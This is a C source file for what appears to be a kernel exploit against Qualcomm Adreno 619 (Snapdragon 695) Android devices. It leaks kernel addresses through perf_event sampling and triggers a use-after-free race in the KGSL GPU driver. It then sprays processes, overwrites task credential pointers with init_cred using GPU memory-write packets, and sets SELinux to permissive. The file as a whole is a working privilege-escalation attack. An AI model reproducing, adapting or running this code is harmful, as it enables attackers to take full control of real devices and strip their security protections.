#include "avc_bypass.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <sys/syscall.h>
#include <linux/perf_event.h>
#include <asm/unistd.h>
#include <time.h>
#include <signal.h>

static int kgsl_fd = -1;
static volatile int race_done = 0;
static uint64_t alloc_flags = 0;
static int uaf_id = -1;

static void die(const char *msg) { perror(msg); exit(1); }

/* ==================== PM4 ==================== */
static uint32_t pm4_parity(uint32_t v) {
    return (0x9669 >> (0xF & (v ^ (v>>4) ^ (v>>8) ^ (v>>12) ^ (v>>16) ^ (v>>20) ^ (v>>24) ^ (v>>28)))) & 1;
}
static uint32_t cp_type7(uint32_t opcode, uint32_t cnt) {
    return (7<<28) | (cnt&0x3FFF) | (pm4_parity(cnt)<<15) | ((opcode&0x7F)<<16) | (pm4_parity(opcode)<<23);
}
#define CP_NOP 0x10
#define CP_MEM_WRITE 0x3D

static void split64(uint64_t addr, uint32_t *lo, uint32_t *hi) {
    *lo = (uint32_t)addr; *hi = (uint32_t)(addr >> 32);
}

/* ==================== KGSL 基本操作 ==================== */
static int gpuobj_alloc(uint64_t size, uint64_t flags) {
    struct kgsl_gpuobj_alloc a = { .size = size, .flags = flags };
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &a) < 0) die("gpuobj_alloc");
    return a.id;
}
static void gpuobj_free(unsigned int id) {
    struct kgsl_gpuobj_free f = { .id = id };
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &f) < 0) die("gpuobj_free");
}
static void *gpuobj_mmap(size_t size, unsigned int id) {
    void *p = mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_SHARED, kgsl_fd, (off_t)id << 12);
    if (p == MAP_FAILED) die("gpuobj_mmap");
    return p;
}
static int gpuobj_info(unsigned int id, uint64_t *gpuaddr) {
    struct kgsl_gpuobj_info inf = { .id = id };
    int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_INFO, &inf);
    if (ret == 0 && gpuaddr) *gpuaddr = inf.gpuaddr;
    return ret;
}
static unsigned int create_context(void) {
    struct kgsl_drawctxt_create c = { .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC };
    if (ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_CREATE, &c) < 0) die("create_context");
    return c.drawctxt_id;
}
static int wait_timestamp(unsigned int ctx_id, unsigned int target) {
    struct kgsl_cmdstream_readtimestamp_ctxtid r = { .context_id = ctx_id, .type = KGSL_TIMESTAMP_RETIRED };
    for (int i = 0; i < 100000; i++) {
        if (ioctl(kgsl_fd, IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID, &r) != 0) return -1;
        if (r.timestamp >= target) return 0;
        usleep(100);
    }
    return -2;
}
static int submit_ib(unsigned int ctx_id, uint64_t ib_gpuaddr,
    size_t ib_bytes, unsigned int ib_id, unsigned int *out_ts) {
    struct kgsl_command_object cmd_obj = {
        .gpuaddr = ib_gpuaddr, .size = ib_bytes,
        .flags = KGSL_CMDLIST_IB, .id = ib_id
    };
    struct kgsl_gpu_command gc = {0};
    gc.cmdlist = (uint64_t)(uintptr_t)&cmd_obj;
    gc.cmdsize = sizeof(cmd_obj);
    gc.numcmds = 1;
    gc.context_id = ctx_id;
    int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPU_COMMAND, &gc);
    if (out_ts) *out_ts = gc.timestamp;
    return ret;
}

/* ==================== KASLR 検出 ==================== */
static long perf_open(struct perf_event_attr *attr, pid_t pid, int cpu, int group_fd, unsigned long flags) {
    return syscall(__NR_perf_event_open, attr, pid, cpu, group_fd, flags);
}
static uint64_t detect_kaslr(void) {
    struct perf_event_attr pe = {0};
    pe.type = PERF_TYPE_HARDWARE;
    pe.size = sizeof(pe);
    pe.config = PERF_COUNT_HW_CPU_CYCLES;
    pe.sample_type = PERF_SAMPLE_IP;
    pe.sample_period = 100;
    pe.disabled = 1;
    pe.exclude_kernel = 0; pe.exclude_hv = 1; pe.exclude_user = 1;

    int fd = perf_open(&pe, 0, -1, -1, 0);
    if (fd < 0) return 0;

    int npages = 256;
    size_t mmap_size = (1 + npages) * 4096;
    void *buf = mmap(NULL, mmap_size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
    if (buf == MAP_FAILED) { close(fd); return 0; }

    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
    usleep(500000);
    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

    struct perf_event_mmap_page *pmp = (struct perf_event_mmap_page *)buf;
    uint64_t head = pmp->data_head;
    uint64_t tail = pmp->data_tail;
    uint8_t *data = (uint8_t *)buf + pmp->data_offset;
    uint64_t data_size = pmp->data_size;

    uint64_t first_ip = 0;
    while (tail < head) {
        uint64_t idx = tail & (data_size - 1);
        struct perf_event_header *hdr = (struct perf_event_header *)(data + idx);
        if (hdr->type == PERF_RECORD_SAMPLE && (hdr->misc & PERF_RECORD_MISC_KERNEL)) {
            first_ip = *(uint64_t *)(hdr + 1);
            break;
        }
        tail += hdr->size;
    }
    munmap(buf, mmap_size);
    close(fd);
    return (first_ip == 0) ? 0 : (first_ip - VMLINUX_TEXT) & ~0x1FFFFFULL;
}

/* ==================== レーススレッド ==================== */
static void *race_thread(void *arg) {
    while (!race_done) {
        int id = gpuobj_alloc(OVERLAP_SIZE, alloc_flags);
        if (id >= 0) gpuobj_free(id);
        usleep(50);
    }
    return NULL;
}

/* ==================== CP_MEM_WRITE ==================== */
static void gpu_write_kernel(uint64_t va, uint64_t val,
                             uint64_t ib_ga, void *ib_m,
                             unsigned int ctx_id, unsigned int ib_id) {
    uint32_t cmd[16];
    int dw = 0;
    uint32_t lo, hi;
    split64(va, &lo, &hi);
    cmd[dw++] = cp_type7(CP_NOP, 0);
    cmd[dw++] = cp_type7(CP_MEM_WRITE, 4);
    cmd[dw++] = lo; cmd[dw++] = hi;
    split64(val, &lo, &hi);
    cmd[dw++] = lo; cmd[dw++] = hi;
    cmd[dw++] = cp_type7(CP_NOP, 0);

    memcpy(ib_m, cmd, dw * 4);
    __sync_synchronize();
    unsigned int ts;
    if (submit_ib(ctx_id, ib_ga, dw * 4, ib_id, &ts) == 0)
        wait_timestamp(ctx_id, ts);
}

/* ==================== setenforce 0 ==================== */
static int try_setenforce0(void) {
    int fd = open(AVC_ENFORCE_PATH, O_WRONLY);
    if (fd < 0) return 0;
    ssize_t w = write(fd, "0", 1);
    close(fd);
    return (w == 1);
}

/* ==================== 子プロセススプレー ==================== */
static pid_t spray_pids[SPRAY_PIDS];
static int n_spray = 0;

static void spawn_spray(void) {
    printf("[SPRAY] spawning...\n");
    for (int i = 0; i < SPRAY_PIDS; i++) {
        pid_t p = fork();
        if (p == 0) {
            prctl(PR_SET_NAME, "TASKUAF!!");
            for (;;) usleep(200000);
        }
        if (p > 0) spray_pids[n_spray++] = p;
        else break;
    }
    printf("[SPRAY] %d children\n", n_spray);
}

static void kill_spray_children(void) {
    for (int i = 0; i < n_spray; i++) kill(spray_pids[i], SIGKILL);
    while (waitpid(-1, NULL, 0) > 0);
}

/* ==================== メイン ==================== */
int main(int argc, char **argv) {
    setbuf(stdout, NULL);
    printf("[*] avc_bypass for Snapdragon 695 (Adreno 619) - UAF + cred overwrite\n");

    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0) die("open kgsl");
    printf("[+] kgsl fd=%d\n", kgsl_fd);

    /* KASLR 検出 */
    uint64_t kaslr = detect_kaslr();
    if (!kaslr) { printf("[-] KASLR detection failed\n"); close(kgsl_fd); return 1; }
    printf("[+] KASLR = 0x%lx\n", (unsigned long)kaslr);
    uint64_t init_cred_addr = kaslr + VMLINUX_INIT_CRED_OFFSET;
    printf("[*] init_cred = 0x%lx\n", (unsigned long)init_cred_addr);

    /* --- 重要な修正: CPUマップを使わない --- */
    alloc_flags = KGSL_CACHEMODE_WRITEBACK;  // CPUマップなし

    /* Phase 1: 大領域を確保 (UAF_SIZE) */
    printf("[*] Phase 1: Allocate large object (UAF)\n");
    uaf_id = gpuobj_alloc(UAF_SIZE, alloc_flags);
    uint64_t uaf_gpuaddr = 0;
    gpuobj_info(uaf_id, &uaf_gpuaddr);
    printf("  UAF object id=%d gpuaddr=0x%lx\n", uaf_id, (unsigned long)uaf_gpuaddr);

    /* Phase 2: 解放して再利用を狙う (レース) */
    printf("[*] Phase 2: Free and race for reuse\n");
    gpuobj_free(uaf_id);
    printf("  Freed UAF object\n");

    /* ページ回収 */
    int rf = open("/proc/sys/vm/compact_memory", O_WRONLY);
    if (rf >= 0) { write(rf, "1", 1); close(rf); }
    rf = open("/proc/sys/vm/drop_caches", O_WRONLY);
    if (rf >= 0) { write(rf, "3", 1); close(rf); }
    usleep(10000);

    /* レーススレッドを起動 */
    pthread_t thr;
    if (pthread_create(&thr, NULL, race_thread, NULL) != 0) die("pthread");
    printf("  Race thread started\n");

    /* 子プロセスをスプレー (task_struct を配置) */
    spawn_spray();

    /* オーバーラップオブジェクトを確保 (同じ GPU アドレスを狙う) */
    printf("[*] Phase 3: Allocate overlapped object (try to reuse same GPU address)\n");
    int ov_id = -1;
    uint64_t ov_gpuaddr = 0;
    int max_attempts = 1000;
    for (int attempt = 0; attempt < max_attempts; attempt++) {
        ov_id = gpuobj_alloc(OVERLAP_SIZE, alloc_flags);
        if (ov_id < 0) { usleep(1000); continue; }
        gpuobj_info(ov_id, &ov_gpuaddr);
        if (ov_gpuaddr == uaf_gpuaddr) {
            printf("  [SUCCESS] Overlapped object at same GPU address 0x%lx (attempt %d)\n",
                   (unsigned long)ov_gpuaddr, attempt);
            break;
        }
        gpuobj_free(ov_id);
        ov_id = -1;
        usleep(1000);
    }
    if (ov_id < 0) {
        printf("[-] Failed to reuse GPU address after %d attempts\n", max_attempts);
        race_done = 1;
        pthread_join(thr, NULL);
        close(kgsl_fd);
        return 1;
    }
    race_done = 1;
    pthread_join(thr, NULL);

    /* Phase 4: GPU コマンド用の準備 */
    unsigned int ctx_id = create_context();
    int ib_id = gpuobj_alloc(0x10000, alloc_flags);
    void *ib_m = gpuobj_mmap(0x10000, ib_id);
    uint64_t ib_ga = 0;
    gpuobj_info(ib_id, &ib_ga);
    printf("[GPU] ctx=%u ib_ga=0x%lx\n", ctx_id, (unsigned long)ib_ga);

    /* Phase 5: オーバーラップ領域内の cred ポインタを init_cred に書き換え */
    printf("[*] Phase 5: Overwrite cred pointers in overlapped region\n");
    uint64_t start = ov_gpuaddr + 0x600;   // task_struct->cred のオフセット候補
    uint64_t end = ov_gpuaddr + 0x800;     // 範囲を広めに
    int writes = 0;
    for (uint64_t va = start; va < end; va += 8) {
        gpu_write_kernel(va, init_cred_addr, ib_ga, ib_m, ctx_id, ib_id);
        writes++;
    }
    printf("  Wrote %d cred pointers\n", writes);

    /* キャッシュ同期 */
    __sync_synchronize();
    usleep(100000);

    /* Phase 6: setenforce 0 を試行 */
    printf("[*] Phase 6: Trying setenforce 0\n");
    int ok = try_setenforce0();
    if (!ok) {
        /* もう一度範囲を広げて試行 */
        printf("[!] Retry with wider range\n");
        start = ov_gpuaddr + 0x500;
        end = ov_gpuaddr + 0x900;
        for (uint64_t va = start; va < end; va += 8) {
            gpu_write_kernel(va, init_cred_addr, ib_ga, ib_m, ctx_id, ib_id);
        }
        __sync_synchronize();
        usleep(100000);
        ok = try_setenforce0();
    }

    if (ok) {
        printf("[+] ### SETENFORCE 0 SUCCEEDED — SELinux permissive ###\n");
    } else {
        printf("[-] SELinux still enforcing\n");
    }

    /* ステータス確認 */
    int fd = open("/sys/fs/selinux/enforce", O_RDONLY);
    if (fd >= 0) {
        char v[8]; ssize_t n = read(fd, v, sizeof(v)-1);
        close(fd);
        if (n > 0) { v[n] = 0; printf("[*] getenforce: %s\n", v); }
    }

    kill_spray_children();
    close(kgsl_fd);
    return ok ? 0 : 1;
}
